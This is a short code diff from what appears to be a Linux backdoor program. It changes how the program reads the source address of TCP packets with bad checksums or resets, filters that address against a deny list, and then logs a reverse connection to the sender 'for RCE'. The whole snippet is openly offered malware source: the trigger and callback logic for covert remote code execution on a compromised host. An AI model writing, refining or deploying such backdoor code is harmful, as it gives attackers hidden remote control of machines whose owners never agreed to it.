@@ -347,27 +347,14 @@ int main(int argc, char **argv) {
       if (err < 0) {
         continue;
       }
-      ignore = 0;
 
-      // Arrange the saddrval bytes from the kernel
-      if (ret.event_src_code == EVENT_SRC_BAD_CSUM) {
-        boopprintf("  ** Boop EVENT_SRC_BAD_CSUM\n");
-        char saddrval6[INET6_ADDRSTRLEN];
-        // Hacky translation system to get the bytes rendered
-        //
-        // TODO Left off here! Come fix this translation! Oof!
-        //
-        inet_ntop(AF_INET6, ret.saddr, saddrval6, INET6_ADDRSTRLEN);
-        inet_pton(AF_INET, saddrval6, saddrbytes);
-      }else if (ret.event_src_code == EVENT_SRC_RECEIVE_RESET) {
-        boopprintf("  ** Boop EVENT_SRC_RECEIVE_RESET\n");
-        memcpy(saddrbytes,ret.saddr,sizeof saddrbytes);
-      }
-
-      // Calculate saddrval once and for all
+      // Calculate saddrval
+      // Copy the first 4 bytes on to saddrbytes
+      memcpy(saddrbytes,ret.saddr,sizeof saddrbytes);
       inet_ntop(AF_INET, &saddrbytes, saddrval, sizeof(saddrval));
 
-
+      // ---- [ FILTER ] -----
+      ignore = 0;
       for (int i = 0; i < cfg.denyc; i++) {
         if (strncmp(saddrval, cfg.deny[i], INET_ADDRSTRLEN) == 0) {
           // Ignoring string in deny list
@@ -375,7 +362,17 @@ int main(int argc, char **argv) {
           break;
         }
       }
+      // ---- [ FILTER ] ----
+
       if (!ignore) {
+        // Arrange the saddrval bytes from the kernel
+        if (ret.event_src_code == EVENT_SRC_BAD_CSUM) {
+          boopprintf("  ** Boop EVENT_SRC_BAD_CSUM\n");
+        }else if (ret.event_src_code == EVENT_SRC_RECEIVE_RESET) {
+          boopprintf("  ** Boop EVENT_SRC_RECEIVE_RESET\n");
+        }
+        boopprintf("  ** Boop source: %s\n", saddrval);
+
         // TODO Parse RCE from map/encapsulation and check here
         if (!cfg.localonly) {
           boopprintf("  -> Reverse connect() %s for RCE\n", saddrval);
